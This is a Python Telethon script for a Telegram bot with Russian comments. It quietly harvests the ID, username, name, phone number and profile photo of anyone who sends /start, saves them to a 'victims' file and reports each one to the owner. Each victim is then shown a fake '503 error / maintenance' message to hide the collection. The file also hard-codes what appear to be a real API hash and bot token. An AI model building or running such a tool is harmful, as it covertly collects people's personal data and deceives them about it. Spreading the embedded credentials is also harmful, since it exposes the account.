from telethon import TelegramClient, events
from datetime import datetime
import asyncio
import os
import json

API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Хранилище данных
victims = []

def save_victim(user):
    victims.append({
        "id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone": getattr(user, 'phone', 'Скрыт'),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    with open("victims.json", "w", encoding="utf-8") as f:
        json.dump(victims, f, indent=2, ensure_ascii=False)

@client.on(events.NewMessage(pattern='/start'))
async def handler(event):
    user = await event.get_sender()
    
    if user.id == OWNER_ID:
        await event.reply(
            "✅ **БОТ АКТИВЕН**\n\n"
            "📌 Команды:\n"
            "/stats - статистика\n"
            "/list - список жертв\n"
            "/clear - очистить список\n"
            "/help - помощь\n\n"
            f"👤 Ваш ID: {OWNER_ID}"
        )
        return
    
    # Сбор данных
    phone = getattr(user, 'phone', 'Скрыт')
    
    # Сохранение
    save_victim(user)
    
    # Отчет владельцу
    report = f"""
【НОВАЯ ЖЕРТВА】
┌─────────────────────
│ ID: {user.id}
│ Username: @{user.username}
│ Имя: {user.first_name} {user.last_name}
│ Телефон: {phone}
│ Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}
└─────────────────────
Ссылка: tg://user?id={user.id}"""
    
    await client.send_message(OWNER_ID, report)
    
    # Аватар
    try:
        photos = await client.get_profile_photos(user.id, limit=1)
        if photos:
            await client.send_file(OWNER_ID, photos[0], caption=f"@{user.username}")
    except:
        pass
    
    # Заглушка жертве
    await event.reply(
        "⚠️ **Ошибка 503**\n\n"
        "Сервис временно недоступен.\n"
        "Пожалуйста, попробуйте позже.\n\n"
        "_____\n"
        "Технические работы"
    )

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    count = len(victims)
    await event.reply(
        f"📊 **СТАТИСТИКА**\n\n"
        f"Всего жертв: {count}\n"
        f"Бот активен: ✅\n"
        f"Запущен: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    )

@client.on(events.NewMessage(pattern='/list', from_users=OWNER_ID))
async def list_victims(event):
    if not victims:
        await event.reply("Список пуст")
        return
    
    text = "📋 **СПИСОК ЖЕРТВ**\n\n"
    for i, v in enumerate(victims[-20:], 1):
        text += f"{i}. {v['first_name']} @{v['username']} | {v['time']}\n"
    
    if len(victims) > 20:
        text += f"\n... и еще {len(victims)-20}"
    
    await event.reply(text)

@client.on(events.NewMessage(pattern='/clear', from_users=OWNER_ID))
async def clear(event):
    global victims
    victims = []
    if os.path.exists("victims.json"):
        os.remove("victims.json")
    await event.reply("✅ Список очищен")

@client.on(events.NewMessage(pattern='/help', from_users=OWNER_ID))
async def help_cmd(event):
    await event.reply(
        "📚 **КОМАНДЫ БОТА**\n\n"
        "/start - запуск\n"
        "/stats - статистика\n"
        "/list - список жертв\n"
        "/clear - очистить список\n"
        "/help - помощь\n\n"
        "📌 Данные сохраняются в victims.json"
    )

print("=" * 40)
print("БОТ ЗАПУЩЕН")
print(f"API ID: {API_ID}")
print(f"Владелец: {OWNER_ID}")
print("=" * 40)

client.run_until_disconnected()
